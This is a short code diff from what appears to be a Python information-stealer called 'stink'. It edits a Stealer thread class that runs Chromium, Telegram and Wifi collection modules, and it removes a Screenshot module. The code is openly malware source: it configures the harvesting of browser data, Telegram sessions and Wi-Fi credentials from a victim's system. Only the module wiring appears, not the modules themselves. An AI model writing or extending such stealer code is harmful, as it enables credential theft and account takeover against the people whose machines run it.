@@ -6,7 +6,6 @@ from stink.helpers import functions, MemoryStorage
 from stink.helpers.config import MultistealerConfig, Browsers
 from stink.modules import (
     Chromium,
-    Screenshot,
     Telegram,
     Wifi,
 )
@@ -75,10 +74,6 @@ class Stealer(Thread):
             },
             {
                 "object": Wifi,
-                "arguments": ("System",),
-            },
-            {
-                "object": Screenshot,
                 "arguments": ("System",),
             },
             {
